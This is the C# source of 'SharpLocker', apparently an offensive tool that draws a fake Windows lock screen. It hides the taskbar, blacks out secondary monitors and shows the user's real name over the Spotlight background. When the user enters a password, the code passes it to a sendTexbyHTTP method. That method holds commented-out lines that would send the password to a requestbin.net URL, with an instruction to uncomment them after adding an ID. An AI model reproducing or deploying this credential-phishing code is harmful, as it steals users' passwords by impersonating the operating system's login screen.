using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net;
using Microsoft.Win32;
using System.IO;


namespace SharpLocker
{
    public partial class LockScreenForm : Form
    {
        public LockScreenForm()
        {
            InitializeComponent();
            Taskbar.Hide();
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Image myimage = new Bitmap(getSpotlightImage());
            BackgroundImage = myimage;
            BackgroundImageLayout = ImageLayout.Stretch;
            this.TopMost = true;
            string userName = System.DirectoryServices.AccountManagement.UserPrincipal.Current.DisplayName;
            UserNameLabel.Text = userName;
            UserNameLabel.BackColor = System.Drawing.Color.Transparent;

            int percentHeight = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100);
            int middleWidth = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Width) / 2);
            int tbsize = 28;
            int tbwidth = 200;
            
            ProfileIcon.Top = percentHeight * 27;
            ProfileIcon.Left = middleWidth - 100;

            UserNameLabel.Top = percentHeight * 51;
            UserNameLabel.Left = middleWidth - 201;
            
            SubmitPasswordButton.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            SubmitPasswordButton.Left = middleWidth + (tbwidth / 2) - 11;

            show.Top = Convert.ToInt32(percentHeight * 59 - (tbsize * 0.125));
            show.Left = middleWidth + (tbwidth / 2) - 45;

            PasswordTextBox.Top = Convert.ToInt32(percentHeight * 59.4);
            PasswordTextBox.Size = new System.Drawing.Size(tbwidth-4, Convert.ToInt32(tbsize));
            PasswordTextBox.Left = middleWidth - (tbwidth / 2) - 12;

            textboxBackground.Top = Convert.ToInt32(percentHeight * 59 - (tbsize*0.125));
            textboxBackground.Left = Convert.ToInt32(middleWidth - (tbwidth / 2) - (tbsize * 0.125) - 12);
            textboxBackground.Size = new System.Drawing.Size(Convert.ToInt32(tbwidth + (tbsize * 0.25)), Convert.ToInt32(tbsize*1.25));

            power.Left = Screen.PrimaryScreen.Bounds.Width - 60;
            power.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            accessibility.Left = Screen.PrimaryScreen.Bounds.Width - 110;
            accessibility.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            language.Left = Screen.PrimaryScreen.Bounds.Width - 160;
            language.Top = Screen.PrimaryScreen.Bounds.Height - 60;

            foreach (var screen in Screen.AllScreens)
            {

                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }
        }

        public class Taskbar
        {
            [DllImport("user32.dll")]
            private static extern int FindWindow(string className, string windowText);

            [DllImport("user32.dll")]
            private static extern int ShowWindow(int hwnd, int command);

            [DllImport("user32.dll")]
            public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

            [DllImport("user32.dll")]
            private static extern int GetDesktopWindow();

            private const int SW_HIDE = 0;
            private const int SW_SHOW = 1;

            protected static int Handle
            {
                get
                {
                    return FindWindow("Shell_TrayWnd", "");
                }
            }

            protected static int HandleOfStartButton
            {
                get
                {
                    int handleOfDesktop = GetDesktopWindow();
                    int handleOfStartButton = FindWindowEx(handleOfDesktop, 0, "button", 0);
                    return handleOfStartButton;
                }
            }

            public static void Show()
            {
                ShowWindow(Handle, SW_SHOW);
                ShowWindow(HandleOfStartButton, SW_SHOW);
            }

            public static void Hide()
            {
                ShowWindow(Handle, SW_HIDE);
                ShowWindow(HandleOfStartButton, SW_HIDE);
            }
        }

        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == true)
                {


                }

                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch { }
        }
        public string getSpotlightImage()
        {
            //Get Windows Spotlight Images Location Path. (C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\)
            string spotlight_dir_path = @Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\");

            /* Save the name of the larger image from spotlight dir.
             * Normally the larger image present in this directory is the current lock screen image. */
            string img_name = "";

            //Save image full path
            string img_path = "";

            DirectoryInfo folderInfo = new DirectoryInfo(spotlight_dir_path);
            long largestSize = 0;
            foreach (var fi in folderInfo.GetFiles())
            {
                if (fi.Length > largestSize)
                {
                    largestSize = fi.Length;
                    img_name = fi.Name;
                }
            }
            img_path = Path.Combine(spotlight_dir_path, img_name);

            return img_path;
        }

        private void sendTexbyHTTP(string tBoxText)
        {
            //=== uncomment this lines after put you corret id ===
            //HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/YOUR_ID?" + tBoxText);
            //request.GetResponse();
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
        }

        private void show_MouseDown(object sender, MouseEventArgs e)
        {
            PasswordTextBox.UseSystemPasswordChar = false;
        }

        private void show_MouseUp(object sender, MouseEventArgs e)
        {
            PasswordTextBox.UseSystemPasswordChar = true;
        }

        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                sendTexbyHTTP(PasswordTextBox.Text);
                Taskbar.Show();
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            sendTexbyHTTP(PasswordTextBox.Text);
            Taskbar.Show();
            Application.Exit();
        }

    }
}